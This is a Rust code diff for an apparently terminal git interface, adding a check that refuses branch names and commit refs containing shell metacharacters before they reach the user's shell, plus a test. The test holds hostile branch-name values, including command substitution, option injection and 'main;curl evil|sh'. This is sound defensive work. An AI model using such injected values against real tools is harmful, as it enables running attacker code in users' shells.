@@ -552,6 +552,7 @@ impl App {
                     Load::Loaded(v) => filtered_commits(v, &g.filter).nth(g.cursor)?.sha.clone(),
                     _ => return None,
                 };
+                let sha = shell_safe_ref(&sha)?;
                 Some(format!("git show {sha}"))
             }
             Section::Branches if diff => {
@@ -559,6 +560,7 @@ impl App {
                     Load::Loaded(v) => filtered_branches(v, &g.filter).nth(g.cursor)?.name.clone(),
                     _ => return None,
                 };
+                let name = shell_safe_ref(&name)?;
                 Some(format!("git log --oneline -20 {name}"))
             }
             _ => None,
@@ -566,11 +568,74 @@ impl App {
     }
 }
 
+/// Gate a git ref/sha before it's interpolated into a command typed at the
+/// user's **interactive shell** (`git_run_in_pane`). Git's ref format permits
+/// shell metacharacters (`;`, `$(…)`, `|`, backticks…), so a branch fetched
+/// from an untrusted repo could otherwise execute in the user's shell.
+/// Real-world refs use only this charset; anything outside it (or a leading
+/// `-`, which would read as an option) is refused — the action is dropped
+/// rather than quoted, since quoting rules differ across shells (fish vs
+/// POSIX) and a metacharacter ref is essentially always hostile.
+fn shell_safe_ref(s: &str) -> Option<&str> {
+    let ok = !s.is_empty()
+        && !s.starts_with('-')
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-'));
+    ok.then_some(s)
+}
+
 #[cfg(all(test, unix))]
 mod tests {
     use super::*;
     use std::process::Command;
     use std::time::{Duration, Instant};
+
+    // A branch fetched from an untrusted repo may legally contain shell
+    // metacharacters; those refs must never reach the interactive shell.
+    #[test]
+    fn hostile_branch_names_never_reach_the_shell() {
+        use crate::git::model::BranchInfo;
+        let mk = |name: &str| BranchInfo {
+            name: name.to_string(),
+            is_head: false,
+            ahead: 0,
+            behind: 0,
+            subject: String::new(),
+            author: String::new(),
+            when: String::new(),
+        };
+        let (tx, _rx) = std::sync::mpsc::channel();
+        let mut app = App::new(80, 24, tx).unwrap();
+        let mut view = GitView::new(std::path::PathBuf::from("/tmp"));
+        view.section = Section::Branches;
+        view.branches = Load::Loaded(vec![
+            mk("feat/scroll-mode_v2.1"), // normal → allowed
+            mk("x$(touch /tmp/pwned)"),  // command substitution → refused
+            mk("main;curl evil|sh"),     // command chaining → refused
+            mk("--exec=evil"),           // option injection → refused
+            mk("weird`cmd`"),            // backticks → refused
+        ]);
+        let placeholder = PaneId::alloc();
+        app.workspaces[0].tabs.push(Tab {
+            layout: TileLayout::new(placeholder),
+            git: Some(Box::new(view)),
+            orch: false,
+        });
+        app.workspaces[0].active_tab = app.workspaces[0].tabs.len() - 1;
+
+        let cmd_at = |app: &mut App, i: usize| {
+            app.active_git_mut().unwrap().cursor = i;
+            app.git_selected_command(true)
+        };
+        assert_eq!(
+            cmd_at(&mut app, 0),
+            Some("git log --oneline -20 feat/scroll-mode_v2.1".to_string()),
+            "a normal branch still gets its diff command"
+        );
+        for i in 1..5 {
+            assert_eq!(cmd_at(&mut app, i), None, "hostile branch {i} is refused");
+        }
+    }
 
     #[test]
     fn default_section_is_commits_and_click_switches() {
